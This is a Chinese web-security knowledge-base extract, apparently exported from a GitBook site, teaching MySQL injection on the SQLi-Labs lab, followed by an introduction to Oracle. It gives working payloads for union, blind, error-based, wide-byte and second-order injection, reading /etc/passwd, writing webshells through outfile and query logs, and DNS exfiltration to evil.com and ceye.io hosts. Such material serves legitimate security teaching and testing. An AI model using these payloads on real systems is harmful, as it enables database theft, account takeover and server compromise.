LOCATE()。 LOWER(str) 将字符串的大写字母全部转成小写。同：LCASE(str)。 UPPER(str) 将字符串的小写字母全部转成大写。同：UCASE(str)。 ELT(N,str1,str2,str3,...) 与MAKE_SET(bit,str1,str2...)类似，根据N返回参数值。 NULLIF(expr1,expr2) 若expr1与expr2相同，则返回expr1，否则返回NULL。 CHARSET(str) 返回字符串使用的字符集。 DECODE(crypt_str,pass_str) 使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：ENCODE(str,pass_str)。 常用语句 获取数据库版本 select version(); 获取当前用户 select user() 获取所有数据库 select schema_name from information_schema.schemata; 获取当前数据库 select database() 获取用户 desc mysql.user select * from mysql.user 获取当前数据库的表名 select table_name from information_schema.tables where table_schema = database() 获取当前数据库的某表的列名 select column_name from information_schema.columns where table_name = 'users' 获取当前数据库某表的值 select id ,username,password from users; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 10:59:08 "},"知识库/01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html","title":"MySQL注入基础","keywords":"","body":"初始环境 环境 版本 服务器 Ubuntu 14.04 web 容器 Apache2 数据库 mysql 5.5.47 靶场环境（docker） SQLi-Labs（Mysql） MySQL8 (docker) mysql8.0.26 MySQL5(docker) mysql5.5.56 MySQL注入相对于其他注入可能对于大家来讲应该是最拿得出手的，在这里使用SQLi-Labs（MySQL）作为环境依赖，以及选择了MySQL8作为支撑新语法特性来展开讨论，本篇只介绍基础的注入知识，只谈针对MySQL该如何注入，如果有更好的注入大法，希望各位讨论 联合查询注入 页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。 对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字union ，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序； 注入流程 此处以sqli-labs Less 1 举例 首先确定字段数量 使用 order/group by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常。若错误页面与正常页面一致，更换盲注或报错注入 正常页面： 错误页面： 判断页面回显位 根据上述判断的字段数量，使用union select 1,2,3,x... 将定义的数字显示在页面上，即可从中判断页面显示的字段位置。 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 这里在以sqli-labs 的less 1举例说明 通过第2步，找到显位之后，在显示字段位置使用子查询或直接查询，来查询数据。 首先查询当前数据库名database()、数据库账号user()、数据库版本version()等基本信息，再根据不同版本，不同的权限来确定接下来的方法 若MySQL版本 information_schema，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决 直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解 若MySQL版本 >= 5.0 我们看以下SQL语句，使用该语句则可以获取所有的数据库，如果不涉及跨库查询，这一步可以省略 -- sql select schema_name from information_schema.schemata; -- inject sql ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 查表名 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查列名 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+ 查值 ?id=-1' union select 1,2,group_concat(0x23,username,0x23,password) from users--+ 简单来说，查库名 -> 查表名 -> 查列名 -> 查值 -- 判断字段数目 order by -- 联合查询搜集信息(表中字段数为3，注意字符类型，如 int，String之类的) union select 1,2,3 -- 查询当前数据库名称 union select 1,2,database(); -- 查询所有数据库 union select 1,2,group_concat(schema_name) from information_schema.schemata; --查询当前数据库中的所有表名 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database(); -- 查询某表的列名 union select 1,2,group_concat(column_name) from information_shcema.columns where table_name = 'student' -- studnet 表示 具体的表名 -- 查询数据 union select 1,2,group_concat(id,name,age) from student; 盲注 核心：利用逻辑符号/条件函数，让返回的内容/响应时间与正常页面不符 布尔盲注 通过页面对永真条件，or 1=1 与 永假条件，and 1=2 返回的内容是否存在差异，进行判断是否可以进行布尔盲注。通常返回存在/不存在两个结果，就可以判断是否存在布尔盲注 -- 语句如下，如果condition为真，那么整条语句 where 语句则恒真 select * from users where username=$username and (condition) and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() 返回指定字符的ascii码值 count() 计算结果集的数量 length() 返回指定字符串的长度 substr/substring(str,pos,length) 返回截取的子字符串 一般流程 求闭合字符 求当前数据库长度 求当前数据库ascii码值 求表名的数量 求表名的长度 求表名的ascii码值 求列名的数量 求列名的长度 求列名的ascii码值 求字段的数量 求字段的长度 求字段的ascii码值 布尔盲注常见语句 求数据库长度 ?id=1' and (length(database())=8) --+ ?id=1' and (length(database())>7) --+ ?id=-1' or (length(database())>7) --+ # 也可以用大于小于来判断 求数据库名(可以用字符来比对，也可以用ascii来比对) ?id=1' and (left(database(),1)='s') --+ #从左向右截取一个字符 ?id=1' and (left(database(),2)='se') --+ #从左向右截取两个字符 ?id=1' and ascii(substr(database(),1,1)) =115 --+ #从第一个字符开始截取一个字符，也就是第一个字符是's',对应的ascii码是115 ？id=1' and ascii(substr(database(),2,1)) =101 --+ #从第二个字符开始截取一个字符，也就是第二个字符'e',对应的ascii码是101 ?id=1' and ascii(substr(database(),1,1)) 来比较查找 求当前数据库中当前表的数量 ?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema=database()) --+ ?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema='security') --+ 求当前数据库表名的长度 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),7,1)) --+ #表名的长度就是substr函数中的7-1=6,这里是针对security数据库的第一个表emails ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),7,1)) --+ #limit 1,1就是security中得到第二个数据库 ?id=1' and (length((select table_name from information_schema.tables where table_schema='security' limit 0,1) )=6) --+ #第二种方法使用length来测数据库表名的的长度，通过limit来控制是哪一个表 ?id=1' and (length((select table_name from information_schema.tables where table_schema='security' limit 1,1) )=8) --+ 求当前数据库表名 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+ 格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次 猜解 #对security数据库中的第一个表的第一个字符进行ascii的猜解 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+ #对security数据库中的第一个表的第二个字符进行ascii的猜解 求指定表中列的数量 ?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=20 --+ 求对列名的长度 ?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1)) --+ #长度和前面查表名的长度一样，是2-1=1,如果是则返回页面异常，如果不是则返回界面正常，递增测试 方法二： 使用length来判断 ?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2 --+ dump 字段的值 ?id=1' and ascii(substr((select username from security.users limit 0,1),1,1))=67--+ ?id=1' and ascii(substr((select concat(username,':',password) from security.users limit 0,1),1,1))=68--+ 盲注一般找到注入点之后，直接上sqlmap，不会手工去dump，如果sqlmap跑不出来，那么该怎么办？ 这里就要针对ascii字符集来判断，有一个特别重要的思路，利用&运算来进行按位与运算 115 => 01110011 (ascii('s')) 256 = 2 ** 0 + 2 ** 1 + 2 ** 2 + ...... + 2 ** 7 2**0 => 00000001 = 1 2**1 => 00000010 = 2 2**2 => 00000100 = 4 2**3 => 00001000 = 8 2**4 => 00010000 = 16 2**5 => 00100000 = 32 2**6 => 01000000 = 64 2**7 => 10000000 = 128 \\# 我们将待求解的ascii码值与上述值进行与运算 115 & 1 => 1 115 & 2 => 2 115 & 4 => 0 115 & 8 => 0 115 & 16 => 16 115 & 32 => 32 115 & 64 => 64 115 & 128 => 0 1 + 2 + 0 + 0 + 16 + 32 + 64 + 0 = 115 时间盲注 通过判断页面返回内容的响应时间差异进行条件判断。 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。 时间盲注常用函数 if(1,2,3)：如果1为True，则执行2，否则执行3 sleep(x)：延迟x秒之后执行 ascii(char)：将字符转换为对应的ascii码 substr(str,pos,len)：将字符串从pos位开始截取len长度 Benchmark(count,exp)： 执行表达式exp，count次（消耗CPU） case ... when ... then ... else ... end 时间盲注场景 第一种情况：无论输入什么都只显示无信息页面，如登录页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况也不知道。在这种情况下有可能基于时间的SQL注入会有效 第二种情况：无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面，采集用户的IP，浏览器类型，referer字段，session字段，无论用户输入什么，都显示正常页面 相关注入手法同布尔盲注，介绍一下相关的函数 case ... when [条件] then [TRUE 执行的语句] else [FALSE执行的语句] end select * from users where id = 1 and case 1 when 1=1 then sleep(2) else 1 end; Benchmark(count,exp) select BENCHMARK(10000000,md5('a')); 笛卡尔积 select * from users where id = 1 and (select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C); 报错注入 服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。 报错函数通常有最长报错输出的限制，面对这种情况，可以进行分割输出。 特殊函数的特殊参数运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。exp() 函数语法：exp(int x) 返回 e ** x 适用范围： 在mysql>5.5.53时，则不能返回查询结果； 在版本号为5.5.47上可以用来注入： 该函数将会返回e的x次方结果。正常如下图： e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错 将0按位取反，~0，可以看到取值为18446744073709551615，这个值就比709要大很多很多，所以再利用mysql 函数正常取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出 select exp(~(select * from (select version())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.47-0ubuntu0.14.04.1' from dual)))' ?id=1' and exp(~(select * from (select version())x))--+ exp()函数套用两层的子查询的原因： 先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a 再 select from a 查询a ,将结果集a 全部查询出来；这里必须使用嵌套，因为不使用嵌套不加select from 无法大整数溢出。ExtractValue() 函数语法：extractvalue(xml_frag,xpath_expr) 适用范围：5.1.5+ 报错原理: Xpath格式语法书写错误的话，就会报错，如下所示mysql> SELECT extractvalue('xy','/a/b') as result; +--------+ | result | +--------+ | x y | +--------+ SELECT extractvalue('xy','#username') as result > 1105 - XPATH syntax error: '#username' > 时间: 0.001s 由于此报错注入和updatexml都只能爆最大32位，如果要爆出32位之后的数据，需要借助mid函数进行字符截取从而显示32位以后的数据 mid函数 参数 描述 column_name 必需。要提取字符的字段 start 必需。开始位置 length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本 ?id=1' and extractvalue(1, mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()) ,0x23),1,32))--+ 其他爆库，爆字段，爆数据库值等更改SQL语句即可 updatexml() 函数语法：updatexml(XML_document,XPath_String,new_value) 适用范围：5.1.5+ 报错原理: Xpath格式语法书写错误的话，就会报错，同extractValue() -- payload updatexml(1,concat(0x23,user(),0x23),1) ?id=1' and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1)--+ floor报错 相关函数： floor() 函数，向下取整 rand() 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测 floor( rand( 0 ) * 2 ) 产生的序列为011011... 报错原理： 利用数据库表主键不能重复的原理，使用 GROPU BY 分组，产生主键key冗余，导致报错 GROPU BY 原理 已知表users如下 ID NAME 1 AA 2 AA 3 BB sql语句 select count(*) ,name from uses group by name; 在进行分组运算的时候会根据name属性，创建一个虚拟表，从上至下扫描，当扫描到第一行NAME === AA 的时候，当前虚拟表没有该字段，那么插入此虚拟表，count = 1 count name 1 AA 当扫描到第二行 NAME === AA 的时候 当前虚拟表存在该字段，那么count + 1 count name 2 AA 当扫描到第三行 NAME === BB 的时候 当前虚拟表不存在该字段，执行插入，count = 1 count name 2 AA 1 BB 那么利用floor( rand( 0 ) * 2) 这个函数的返回值，进行分组，因为序列为011011... 那么构建SQL语句 SELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x 查询第一条记录，别名x 产生 键值0，当键值 0 不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照GROUP BY分组之时 又要执行floor函数，得到1 ，故向虚拟表中插入键值1，count = 1 COUNT x 1 1 查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2 COUNT x 2 1 查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示 COUNT x 2 1 1 1 由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错 由于数据库报错会将报错原因展示出来，故利用报错来实现注入 由上知，要保证floor报错注入，那么必须 保证数据库必须大于三条数据 取数据库SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, database(), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 由于 and 后要跟1或者0，所以构造sql语句select 1 ，其中 concat()函数是用来连接字符串的函数，因为information_schema.'columns'的数据是大于3条，所以会出现报错，报错结果或将别名x的信息展示出来，展示信息为#(数据库名称)#1冗余 爆表SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, (SELECT table_name from information_schema.`TABLES` WHERE table_schema = database() LIMIT 0,1), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 几何函数 GeometryCollection：id=1 AND GeometryCollection((select from (select from(select user())a)b)) polygon()：id=1 AND polygon((select from(select from(select user())a)b)) multipoint()：id=1 AND multipoint((select from(select from(select user())a)b)) multilinestring()：id=1 AND multilinestring((select from(select from(select user())a)b)) linestring()：id=1 AND LINESTRING((select from(select from(select user())a)b)) multipolygon() ：id=1 AND multipolygon((select from(select from(select user())a)b)) 不存在的函数 随便使用不存在的函数，可能会得到当前所在数据库的名称 BIGINT 当mysql数据库的某些边界数值进行数值运算时，会报错的原理。 如~0得到的结果：18446744073709551615 若此数参与运算，则很容易会错误。 select !(select * from(select user())a)-~0; select * from users where id = 1 and (select !(select * from(select mid(group_concat(table_name),21,32) from information_schema.tables where table_schema = database())a)-~0); name_const() 报错原理： mysql列名重复会导致报错,通过name_const制造一个列 我们可以利用mysql列名重复会导致报错这个原理，配合笛卡尔积查询得到列名 局限：仅可取数据库版本信息 select * from users where id = 1 and (select * from(select name_const(version(),0x1),name_const(version(),0x1))a); uuid 适用版本：8.0.x select * from users where id = 1 and UUID_TO_BIN((SELECT password FROM users WHERE id=1)); SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1)); join using 通过系统关键词join可建立两个表之间的内连接。 通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误。 并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 select * from(select * from users a join (select * from users)b)c; select * from(select * from users a join (select * from users)b using(username))c; select * from(select * from users a join (select * from users)b using(username,password))c GTID() 原理：参数格式不正确 select gtid_subset(user(),1); select gtid_subtract((select * from(select user())a),1); 宽字节注入 举个例子，以SQLi-Labs Less33为例 使用了GBK编码会认为两个字符为一个汉字，所以可以使用一些字符和转义过后多出来的\\组合两个字符，使得数据库不识别字符，对单引号、双引号的转义失败 形成过程 当PHP连接MYSQL时，当设置character_set_client = gbk 时会导致GBK编码转换的问题，当注入的参数里带有%df(%bf)时，在魔术引号开关或者addslashes() 函数的作用下，会将%df%27转换为%df%5c%27，此时%df%5c在会解析成一个汉字，从而“吃掉”反斜杠，单引号因此逃逸出来闭合语句 根本原因 character_set_client（客户端字符集）和 character_set_connection（连接层的字符集）不同，或转换函数如iconv,mb_convert_encoding使用不当 addslashes函数将会把接收到的id的字符进行转义处理。如： 字符'、\"、\\、NULL前边会被添加上一条反斜杠\\作为转义字符 多个空格被过滤成一个空格 当id的字符串被转义之后，就会出现如下所示的SQL语义（查询id'#的数据） select * from users where id = '1\\'#'; 看上去没有办法注入，但是我们看下面的代码： $conn->query(\"set names 'gbk';\"); // => SQL SET character_set_client ='gbk'; SET character_set_results ='gbk'; SET character_set_connection ='gbk'; payload1 ?id=1%df%27 and 1=1 %23 拼接得到的sql语句为 SELECT * FROM users WHERE id='1�\\' and 1=1-- ' LIMIT 0,1 payload2 为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞 使用set name UTF-8指定了utf-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv()函数先转为UTF-8，然后再拼接SQL语句 测试语句： ?id=1%e5%5c%27 and 1=1 --+ %e5%5c 是gbk编码，转换为UTF-8编码是%e9%8c%a6 %e5%5c%27首先从gbk编码经过addslashes函数之后变成%e5%5c%5c%5c%27，再通过iconv()将其转换为UTF-8编码，%e9%8c%a6%5c%5c%27 ，其中%e9%8c%a6是汉字，%5c%5c%27解码之后是\\\\'第一个\\将第二个\\转义，使得%27单引号逃逸，成功闭合语句 order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 以SQLi-Labs Less46 为例 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 ?sort=rand() ?sort=rand(1=1) ?sort=rand(1=2) ?sort=9999 基于报错的注入来判断 返回多条记录导致报错 ?sort=(select 1 union select 2) ?sort=IF(1=1,1,(select+1 from information_schema.tables)) //正确 ?sort=IF(1=2,1,(select 1 from information_schema.tables)) //错误 regexp ?sort=(select 1 regexp if(1=1,1,0x00)) // 正确 ?sort=(select 1 regexp if(1=2,1,0x00)) // 错误 报错注入函数 见报错注入 基于时间盲注来判断 如果直接使用sleep函数，如果表里的数据有n条，sleep(2)，会使查询时间为2*n，会对服务器造成拒绝服务攻击，一般不建议在order by 处使用时间盲注来判断以及注入数据 数据猜解 以猜解user() 为例，由于只能一个字符一个字符的猜解，可以利用SUBSTR,SUBSTRING,MID,以及left和right可以精准分割出每一位子串。然后就是比较操作了可以利用=,like,regexp等 利用手法可见布尔盲注，通过if语句，来对字段进行排列，通过这种差别来完成注入 二次注入 二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。 以SQLi-Labs 24 为例 创建用户执行insert操作的关键代码，mysql_escape_string对传入的参数进行了转义，导致无法sql注入 $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); ... if ($pass==$re_pass) { # Building up the query........ $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; } 登录的关键代码，这里将登录之后的用户名给了session function sqllogin(){ $username = mysql_real_escape_string($_POST[\"login_user\"]); $password = mysql_real_escape_string($_POST[\"login_password\"]); $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); if ($row[1]) { $_SESSION[\"username\"] = $login; setcookie(\"Auth\", 1, time()+3600); /* expire in 15 Minutes */ header('Location: logged-in.php'); } else { return 0; } } 修改密码关键的代码，从session里取用户名，将其带入update SQL语句中 $username= $_SESSION[\"username\"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 在这里可以看到，SQL注入是存在于修改密码处，session['username'] 可控，当用户登录之后，就将用户名存起来了，而用户名又是用户自定义的，当自定义的用户名可以更改SQL语义的时候，就可以完成注入 当在登录，注册处，都无法注入成功的时候，构造用户名admin'#，当被session保存下来，再进行修改密码的时候，此时SQL语句如下所示 UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' 用于判断用户当前密的的语义被注释，导致不用输入用户当前密码，就可以更改admin用户的密码 堆叠注入 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。 HTTP 头部注入 HTTP头部注入其实三大注入方法没什么区别，主要是补一下场景 先了解一下常见的HTTP头 Accept : 浏览器能够处理的内容类型 Accept-Charset : 浏览器能够显示的字符集 Accept-Encoding : 浏览器能处理的压缩编码 Accept-Language : 浏览器当前设置的语言 Connection : 浏览器与服务器之间的连接 cookie : 当前页面设置的cookie Host : 发出请求的页面所在域 Referer : 发出请求的页面URL User-agent : 浏览器用户代理字符串 Server : web服务器表明自己是什么软件及版本信息 HTTP 头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。HTTP头注入常常发生在程序采集用户信息的模块中。例如: X-Forwarded-For/Client-IP 用户IP User-Agent 用户代理的设备信息 Referer 告诉服务器该网页是从哪个页面链接过来的 Cookie 标识用户的身份信息 Cookie型注入是通过Cookie进行数据提交的，其常见的情况有验证登录、$_REQUEST获取参数。验证登录是将用户的登录信息放入Cookie来做权限验证的一种方法 文件读/写 Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。 简单的说：file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。 select file_priv from mysql.user where user=$USER host=$HOST; secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下： 无内容，表示无限制。 为NULL，表示禁止文件读/写。 为目录名，表示仅允许对特定目录的文件进行读/写。 5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。 三种方法查看当前secure-file-priv的值： select @@secure_file_priv; select @@global.secure_file_priv; show variables like \"secure_file_priv\"; 修改secure-file-priv值： 通过修改my.ini文件，添加：secure-file-priv= 启动项添加参数：mysqld.exe --secure-file-priv=读文件 在确定了用户有读，写权限之后，一般使用load_file()函数来读取文件内容select load_file(file_path); -- file_path为绝对路径 load data infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; --读取服务端上的文件 load data local infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; -- 读取客户端上的文件 限制： 前两种需要secure-file-priv无值或为有利目录。 都需要知道要读取的文件所在的绝对路径。 要读取的文件大小必须小于max_allowed_packet所设置的值 写文件 常规写文件的操作有如下字句： select 1,\"\" into outfile '/var/www/html/1.php'; select 2,\"\" into dumpfile '/var/www/html/1.php'; 那么into outfile和into dumpfile有什么区别呢？ into outfile 是导出所有数据，适合导出库 into dumpfile 只能导出一行数据 限制： secure-file-priv无值或为可利用的目录 需知道目标目录的绝对目录地址 目标目录可写，mysql的权限足够。 日志包含 由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。 mysql日志文件的一些相关设置可以直接通过命令来进行： //请求日志 mysql> set global general_log_file = '/var/www/html/1.php'; mysql> set global general_log = on; //慢查询日志 mysql> set global slow_query_log_file='/var/www/html/2.php' mysql> set global slow_query_log=1; //还有其他很多日志都可以进行利用 ... 之后让数据库执行满足记录条件的恶意语句即可，具体可查看phpmyadmin通过日志写入webshell相关的教程 限制： 权限够，可以进行日志的设置操作 知道目标目录的绝对路径DNSlog外带数据盲注 DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。 如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。 应用场景： 三大注入无法使用 有文件读取权限及secure-file-priv无值。 不知道网站/目标文件/目标目录的绝对路径 目标系统为Windows payload: load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\\xxxx')) 为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\\\中的两个\\是用来进行转义处理的。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-03 14:42:28 "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle.html","title":"Oracle","keywords":"","body":"Oracle 简介 Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。 数据库(Database)可以看成是一个大仓库，然后仓库里面又很分了很多的库房(Schema)，一个Schema就是一个库房，那么库房里面自然就有很多货架(Table)， 那么货架上就可以放很多你想存储的东西，有行有列，所以货架(Table)就是数据存储的基本单位。每个库房(Schema)都会有一个管理人员(User),这个关系是对应的，每个User只管理自己相应Schema里面的数据，如果你想要其他Schema里面的数据，就看管理这个Schema的User给不给你权限了，或者说看上一级领导(DBA)有没有给你这个权限，可能有的User管理着好几个Schema。如果你是仓库的老板，那么仓库里面的所有东西都是你的，你想存储什么或丢掉什么都是老板话算，还可以给下层的人分配不同的权限，比如仓库的不同主管，有的主管可能只读，有的主管有读写权限，这个就要涉及到仓库不同的角色(Role)，角色是一个权限的集合，不同的角色有不同的权限去管理这个数据库。 一些基本概念 SID(Site ID)：一个由字母和数字组成的系统标识符用来做实例的唯一性的区别，包含了至少一个应用程序的实例和数据存储设备 实例(Instance):由一个实例数字(或是一个引导ID：SYS.V_$DATABASE.ACTIVATION#）表示，包含了一个操作系统程序的集合和与存储设备进行交谈的内部结构 ORACLE实例 = 进程 + 进程所使用的内存(SGA) 进程：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求 SGA:全称为 System Global Area(系统全局区域)。实际上是内存中的一片共享区域，其中包含实例配置、数据缓存、操作日志、SQL命令、用户信息等信息，由后台进程进行共享 数据库：一般指物理存储的文件，Oracle 数据库除了基本的数据文件，还有控制文件和 Redo 日志(重做文件 + 控制文件 + 数据文件 + 临时文件)，这些文件一般存储在$ORACLE_HOME\\oradata...路径下，后缀名后DBF 关于实例和数据库之间的关系 简而言之，实例是临时性的，数据库是永久性的，一个数据库可以对应多个实例，而一个实例只能对应一个数据库 Oracle 数据结构 逻辑结构：表空间-->段-->区-->块 物理结构 Oracle关系型数据库管理系统从逻辑上把数据保存在表空间内，在物理上以数据文件的形式存储。表空间可以包含多种类型的内存区块，例如数据区块（Data Segment）、索引区块（Index Segment）等等。区块相应的由一个或多个扩展（extent）组成 表空间(Tablespace)：数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库（以下的DBF后缀就是数据库默认创建的表空间） SYSTEM表空间：包含了数据字典以及（默认的）索引和集群。数据字典包含了一个保存了所有数据库中用户对象的信息的表,用于存储系统表和管理配置等基本信息 SYSAUX表空间：是SYSTEM表的一个辅助表空间，主要存放一些系统附加信息，用来降低SYSTEM表空间的负载 TEMP表空间：是个临时表空间，主要用途是在数据库进行排序运算、管理索引、访问视图等操作时提供临时的运算空间，运算完后系统自动清理，可减少内存负担(temp表的大小也会一直增长) UNDOTBS表空间：用于事务回退的表空间，存放撤销数据 USERS表空间：通常用于存放应用系统所使用的数据库对象，存储我们定义的表和数据 EXAMPLE表空间：存放各实例的相关数据 权限和用户 权限与角色 Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的 CURD 操作（即，增加：create，修改：update，查找：read，删除：delete），DBA 则集合了所有的用户权限。 创建数据库时，会默认启用 sys、system 等用户： sys：相当于 Linux 下的 root 用户。为 DBA 角色 system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。 public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）SQL语句 select column, group_function(column) from table [where condition] [group by group_by_expression] [having group_condition] [order by column]; 执行过程：from — where — group by — having — select — order by,可以看出，和MySQL很类似。实际上都是 SQL 标准的语法 参考链接 https://xz.aliyun.com/t/9940 